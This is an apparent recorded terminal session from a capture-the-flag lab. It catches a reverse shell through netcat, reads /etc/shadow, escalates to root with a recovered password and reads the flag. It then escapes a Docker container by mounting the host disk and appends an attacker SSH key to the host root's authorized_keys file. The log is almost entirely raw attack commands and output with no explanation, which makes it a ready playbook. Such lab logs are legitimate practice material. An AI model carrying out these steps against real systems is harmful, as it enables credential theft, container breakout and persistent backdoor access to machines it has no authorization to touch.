@@ -1,0 +1,149 @@
+Script started on 2025-04-12 23:59:52+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 14623
+SOCKET: Shell has connected! PID: 23
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=33(www-data) gid=33(www-data) groups=33(www-data)
+[K[K[?2004hpytho3 [K[Kn3 -c 'import pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[K/bin/bash: line 2: python3: command not found
+[K[K[?2004h[7mpython3 -c 'import pty;pty.spawn("/bin/bash")'[27m[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[K/bin/bash: line 3: python3: command not found
+[K[K[?2004h[7mpython3 -c 'import pty;pty.spawn("/bin/bash")'[27mpython3 -c 'import pty;pty.spawn("/bin/bash")'[C[1P")'[1P")'[1P")'[1P")'s")'h")'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/sh")'
+[K/bin/bash: line 4: python3: command not found
+[K[K[?2004hls[?2004l[K[?2004hls
+[Kreverse.php
+[K[K[?2004hcd /home[?2004l[K[?2004hcd /home
+[K[K[?2004hls -al[?2004l[K[?2004hls -al
+[Ktotal 8
+drwxr-xr-x 2 root root 4096 Apr 10  2021 .
+drwxr-xr-x 1 root root 4096 Sep 15  2021 ..
+[K[K[?2004hwhoami[?2004l[K[?2004hwhoami
+[Kwww-data
+[K[K[?2004hls -al /[?2004l[K[?2004hls -al /
+[Ktotal 88
+drwxr-xr-x   1 root root 4096 Sep 15  2021 .
+drwxr-xr-x   1 root root 4096 Sep 15  2021 ..
+-rwxr-xr-x   1 root root    0 Sep 15  2021 .dockerenv
+drwxr-xr-x   1 root root 4096 Sep  3  2021 bin
+drwxr-xr-x   2 root root 4096 Apr 10  2021 boot
+drwxr-xr-x  13 root root 3580 Apr 12 20:46 dev
+drwxr-xr-x   1 root root 4096 Sep 15  2021 etc
+drwxr-xr-x   2 root root 4096 Apr 10  2021 home
+drwxr-xr-x   1 root root 4096 Sep  3  2021 lib
+drwxr-xr-x   2 root root 4096 Sep  2  2021 lib64
+drwxr-xr-x   2 root root 4096 Sep  2  2021 media
+drwxr-xr-x   2 root root 4096 Sep  2  2021 mnt
+drwxr-xr-x   2 root root 4096 Sep  2  2021 opt
+dr-xr-xr-x 116 root root    0 Apr 12 20:46 proc
+drwx------   1 root root 4096 Sep 15  2021 root
+drwxr-xr-x   1 root root 4096 Sep  3  2021 run
+drwxr-xr-x   1 root root 4096 Sep  3  2021 sbin
+drwxr-xr-x   2 root root 4096 Sep  2  2021 srv
+drwxr-xr-x   2 root root 4096 Sep 15  2021 stage
+dr-xr-xr-x  13 root root    0 Apr 12 20:46 sys
+drwxrwxrwt   1 root root 4096 Sep  3  2021 tmp
+drwxr-xr-x   [Kdrwxr-xr-x   [Kdrwxr-xr-x   1 root root 4096 Sep  2  2021 usr
+drwxr-xr-x   1 root root 4096 Sep  3  2021 var
+[K[K[?2004hcat /.dockerenv[?2004l[K[?2004hcat /.dockerenv
+[K[K[?2004h[7mfind / -perm /4000 2>/dev/null[27m[?2004l[K[?2004hfind / -perm /4000 2>/dev/null
+[K/bin/umount
+/bin/mount
+/bin/cat
+/bin/su
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chsh
+[K[K[?2004hcat /etc/shadow[?2004l[K[?2004hcat /etc/shadow
+[Kroot:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4:18885:0:99999:7:::
+daemon:*:18872:0:99999:7:::
+bin:*:18872:0:99999:7:::
+sys:*:18872:0:99999:7:::
+sync:*:18872:0:99999:7:::
+games:*:18872:0:99999:7:::
+man:*:18872:0:99999:7:::
+lp:*:18872:0:99999:7:::
+mail:*:18872:0:99999:7:::
+news:*:18872:0:99999:7:::
+uucp:*:18872:0:99999:7:::
+proxy:*:18872:0:99999:7:::
+www-data:*:18872:0:99999:7:::
+backup:*:18872:0:99999:7:::
+list:*:18872:0:99999:7:::
+irc:*:18872:0:99999:7:::
+gnats:*:18872:0:99999:7:::
+nobody:*:18872:0:99999:7:::
+_apt:*:18872:0:99999:7:::
+[K[K[?2004hsu root[?2004l[K[?2004hsu root
+[KPassword: [KPassword: [K[?2004hPassword: murder[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hmurder
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=0(root) gid=0(root) groups=0(root)
+[K[K[?2004hwhich python3[?2004l[K[?2004hwhich python3
+[K[K[?2004hcd /root[?2004l[K[?2004hcd /root
+[K[K[?2004hls -al[?2004l[K[?2004hls -al
+[Ktotal 20
+drwx------ 1 root root 4096 Sep 15  2021 .
+drwxr-xr-x 1 root root 4096 Sep 15  2021 ..
+-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
+-rw-r--r-- 1 root root   24 Sep 16  2021 .flag
+-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
+[K[K[?2004hcat .flag[?2004l[K[?2004hcat .flag
+[KTHM{5_murder_most_foul}
+[K[K[?2004hwhich dd[?2004l[K[?2004hwhich dd
+[K/bin/dd
+[K[K[?2004hh[Kwhich nc[?2004l[K[?2004hwhich nc
+[K[K[?2004h[7mls -la /dev | grep disk[27m[?2004l[K[?2004hls -la /dev | grep disk
+[Kcrw-rw----  1 root disk     10, 234 Apr 12 20:46 btrfs-control
+brw-rw----  1 root disk    253,   0 Apr 12 20:46 dm-0
+crw-rw----  1 root disk     10, 237 Apr 12 20:46 loop-control
+brw-rw----  1 root disk      7,   0 Apr 12 20:46 loop0
+brw-rw----  1 root disk      7,   1 Apr 12 20:46 loop1
+brw-rw----  1 root disk      7,   2 Apr 12 20:46 loop2
+brw-rw----  1 root disk      7,   3 Apr 12 20:46 loop3
+brw-rw----  1 root disk      7,   4 Apr 12 20:46 loop4
+brw-rw----  1 root disk      7,   5 Apr 12 20:46 loop5
+brw-rw----  1 root disk      7,   6 Apr 12 20:46 loop6
+brw-rw----  1 root disk      7,   7 Apr 12 20:46 loop7
+brw-rw----  1 root disk    202,   0 Apr 12 20:46 xvda
+brw-rw----  1 root disk    202,   1 Apr 12 20:46 xvda1
+brw-rw----  1 root disk    202,   2 Apr 12 20:46 xvda2
+brw-rw----  1 root disk    202,   3 Apr 12 20:46 xvda3
+brw-rw----  1 root disk    202, 112 Apr 12 20:46 xvdh
+[K[K[?2004h[7mmkdir /mnt/host[27m[?2004l[K[?2004hmkdir /mnt/host
+[K[K[?2004h[7mmount /dev/dm-0 /mnt/host[27m[?2004l[K[?2004hmount /dev/dm-0 /mnt/host
+[K[K[?2004h[7mls -l /mnt/host[27m[?2004l[K[?2004hls -l /mnt/host
+[Ktotal 4015216
+drwxr-xr-x  2 root root       4096 Sep 15  2021 bin
+drwxr-xr-x  2 root root       4096 Sep 15  2021 boot
+drwxr-xr-x  2 root root       4096 Sep 15  2021 cdrom
+drwxr-xr-x  4 root root       4096 Aug  6  2020 dev
+drwxr-xr-x 99 root root       4096 Sep 16  2021 etc
+drwxr-xr-x  5 root root       4096 Sep 15  2021 home
+lrwxrwxrwx  1 root root         34 Sep 15  2021 initrd.img -> boot/initrd.img-4.15.0-156-generic
+lrwxrwxrwx  1 root root         34 Sep 15  2021 initrd.img.old -> boot/initrd.img-4.15.0-156-generic
+drwxr-xr-x 23 root root       4096 Sep 15  2021 lib
+drwxr-xr-x  2 root root       4096 Aug  6  2020 lib64
+drwx------  2 root root      16384 Sep 15  2021 lost+found
+drwxr-xr-x  2 root root       4096 Aug  6  2020 media
+drwxr-xr-x  3 root root       4096 Sep 15  2021 mnt
+drwxr-xr-x  5 root root       4096 Sep 15  2021 opt
+drwxr-xr-x  2 root root       4096 Apr 24  2018 proc
+drwx------  5 root root       4096 Sep 15  2021 root
+drwxr-xr-x 13 root root       4096 Aug  6  2020 run
+drwxr-xr-x  2 r[Kdrwxr-xr-x  2 r[Kdrwxr-xr-x  2 root root      12288 Sep 15  2021 sbin
+drwxr-xr-x  2 root root       4096 Sep 15  2021 snap
+drwxr-xr-x  4 root root       4096 Sep 15  2021 srv
+-rw-------  1 root root 4111466496 Sep 15  2021 swap.img
+drwxr-xr-x  2 root root       4096 Apr 24  2018 sys
+drwxrwxrwt  9 root root       4096 Apr 12 20:49 tmp
+drwxr-xr-x 10 root root       4096 Aug  6  2020 usr
+drwxr-xr-x 14 root root       4096 Sep 15  2021 var
+lrwxrwxrwx  1 root root         31 Sep 15  2021 vmlinuz -> boot/vmlinuz-4.15.0-156-generic
+lrwxrwxrwx  1 root root         31 Sep 15  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-156-generic
+[K[K[?2004hecho "[7mssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9lAtJTTaHr5wyTWhuIe1ZWJqOR5Z+dad+L+OGaLArg h471x@winux[27m[C[C[C[C[C[Cssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9lAtJTTaHr5wyTWhuIe1ZWJqOR5Z+dad+L+OGaLArg h471x@winux" >> [7m/[27m[7mm[27m[7mnt/host/root/.ssh/authorized_keys[27m[A[7mecho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9lAtJTTaHr5wyTWhuIe1ZWJqOR5Z+dad+L+OGaLArg h471x@winux" >> [27m/mnt/host/root/.ssh/authorized_keys[A[?2004l[K
+[K[A[?2004hecho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9lAtJTTaHr5wyTWhuIe1ZWJqOR5Z+dad+L+OGaLArg h471x@winux" >> /mnt/host/root/.ssh/authorized_keys
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[?2004l
+Script done on 2025-04-13 00:16:01+03:00 [COMMAND_EXIT_CODE="0"]
